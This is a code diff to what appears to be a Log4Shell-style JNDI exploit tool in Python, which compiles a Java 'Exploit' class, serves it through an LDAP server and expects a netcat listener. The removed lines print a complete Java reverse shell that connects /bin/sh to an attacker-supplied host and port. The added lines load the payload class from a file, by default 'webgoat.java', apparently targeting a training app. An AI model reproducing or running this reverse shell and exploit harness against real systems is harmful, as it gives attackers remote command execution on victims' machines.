@@ -11,57 +11,16 @@ from http.server import HTTPServer, SimpleHTTPRequestHandler
 CUR_FOLDER = Path(__file__).parent.resolve()
 
 
-def generate_payload(userip: str, lport: int) -> None:
-    program = """
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.net.Socket;
-
-public class Exploit {
-
-    public Exploit() throws Exception {
-        String host="%s";
-        int port=%d;
-        String cmd="/bin/sh";
-        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-        Socket s=new Socket(host,port);
-        InputStream pi=p.getInputStream(),
-            pe=p.getErrorStream(),
-            si=s.getInputStream();
-        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-        while(!s.isClosed()) {
-            while(pi.available()>0)
-                so.write(pi.read());
-            while(pe.available()>0)
-                so.write(pe.read());
-            while(si.available()>0)
-                po.write(si.read());
-            so.flush();
-            po.flush();
-            Thread.sleep(50);
-            try {
-                p.exitValue();
-                break;
-            }
-            catch (Exception e){
-            }
-        };
-        p.destroy();
-        s.close();
-    }
-}
-""" % (userip, lport)
-
-    java_file = open("./Exploit2.java")
+def generate_payload(userip: str, lport: int, expath="webgoat.java") -> None:
+    java_file = open("./" + expath)
     program = java_file.read()
 
     # writing the exploit to Exploit.java file
-
     p = Path("Exploit.java")
 
     try:
         p.write_text(program)
+        print("Compiling " + expath)
         subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
     except OSError as e:
         print(Fore.RED + f'[-] Something went wrong {e}')
@@ -70,8 +29,8 @@ public class Exploit {
         print(Fore.GREEN + '[+] Exploit java class created success')
 
 
-def payload(userip: str, webport: int, lport: int) -> None:
-    generate_payload(userip, lport)
+def payload(userip: str, webport: int, lport: int, expath) -> None:
+    generate_payload(userip, lport, expath)
 
     print(Fore.GREEN + '[+] Setting up LDAP server\n')
 
@@ -130,6 +89,11 @@ def main() -> None:
                         type=int,
                         default='9001',
                         help='Netcat Port')
+    parser.add_argument('--exploit',
+                    metavar='exploit',
+                    type=str,
+                    default='webgoat.java',
+                    help='The exploit class you want to run')
 
     args = parser.parse_args()
 
@@ -137,7 +101,7 @@ def main() -> None:
         if not check_java():
             print(Fore.RED + '[-] Java is not installed inside the repository')
             raise SystemExit(1)
-        payload(args.userip, args.webport, args.lport)
+        payload(args.userip, args.webport, args.lport, args.exploit)
     except KeyboardInterrupt:
         print(Fore.RED + "user interrupted the program.")
         raise SystemExit(0)
